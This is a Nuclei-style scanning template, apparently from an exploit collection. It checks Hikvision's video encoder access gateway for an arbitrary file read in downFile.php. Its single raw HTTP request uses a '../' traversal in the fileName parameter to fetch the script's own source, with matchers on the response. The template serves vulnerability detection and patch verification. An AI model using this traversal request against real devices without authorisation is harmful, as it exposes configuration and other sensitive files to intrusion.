id: hikvision-encoder-gateway-arbitrary-file-download

info:
  name: "HIKVISION 海康威视 视频编码设备接入网关 downFile.php 任意文件读取漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    HIKVISION 海康威视 视频编码设备接入网关组件存在文件下载路径验证缺陷，攻击者可通过构造特定请求参数实现任意文件读取。该漏洞可能暴露系统敏感文件（如配置文件、日志文件等），导致信息泄露风险。
  tags: HIKVISION

http:
- raw:
  - |
    GET /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'file_name'
  - type: word
    part: body
    words:
    - 'file_dir'
